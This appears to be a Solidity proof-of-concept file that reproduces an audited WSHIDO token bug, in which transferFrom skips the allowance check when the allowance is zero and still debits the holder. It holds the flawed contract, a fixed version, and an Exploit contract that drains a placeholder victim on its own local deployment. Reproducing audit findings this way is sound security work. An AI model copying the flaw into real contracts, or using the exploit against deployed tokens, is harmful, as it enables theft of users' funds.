// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  WSHIDO transferFrom — a zero allowance is skipped and the balance still
    moves (Zokyo, Shido, May 2024). Fork of WETH that deducts allowance only
    when it is non-zero, then always debits src. run() does not warp. */

contract WSHIDO {
    string public name = "Wrapped SHIDO";
    string public symbol = "WSHIDO";
    uint8 public decimals = 18;
    address public owner;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 wad) external {
        require(msg.sender == owner, "owner");
        balanceOf[to] += wad;
    }

    function approve(address guy, uint256 wad) external returns (bool) {
        allowance[msg.sender][guy] = wad;
        return true;
    }

    function transferFrom(address src, address dst, uint256 wad) external virtual returns (bool) {
        require(balanceOf[src] >= wad, "balance");
        if (src != msg.sender && allowance[src][msg.sender] != 0) {
            allowance[src][msg.sender] -= wad;
        }
        // @> VULN: zero allowance skips the branch and src is still debited
        balanceOf[src] -= wad;
        balanceOf[dst] += wad;
        return true;
    }
}

contract WSHIDOFixed is WSHIDO {
    function transferFrom(address src, address dst, uint256 wad) external override returns (bool) {
        require(balanceOf[src] >= wad, "balance");
        if (src != msg.sender) {
            require(allowance[src][msg.sender] >= wad, "allowance");
            if (allowance[src][msg.sender] != type(uint256).max) allowance[src][msg.sender] -= wad;
        }
        balanceOf[src] -= wad;
        balanceOf[dst] += wad;
        return true;
    }
}

contract Exploit {
    address public constant VICTIM = 0x3333333333333333333333333333333333333333;
    uint256 public constant STEAL = 1000 ether;

    WSHIDO public token;
    uint256 public victimBefore;
    uint256 public allowanceBefore;
    uint256 public taken;
    uint256 public victimAfter;

    constructor() {
        token = new WSHIDO();
    }

    function run() external {
        token.mint(VICTIM, STEAL);
        victimBefore = token.balanceOf(VICTIM);
        allowanceBefore = token.allowance(VICTIM, address(this));
        token.transferFrom(VICTIM, address(this), STEAL);
        taken = token.balanceOf(address(this));
        victimAfter = token.balanceOf(VICTIM);
        require(allowanceBefore == 0, "allowance");
        require(victimBefore == STEAL, "before");
        require(taken == STEAL, "stolen");
        require(victimAfter == 0, "after");
    }
}
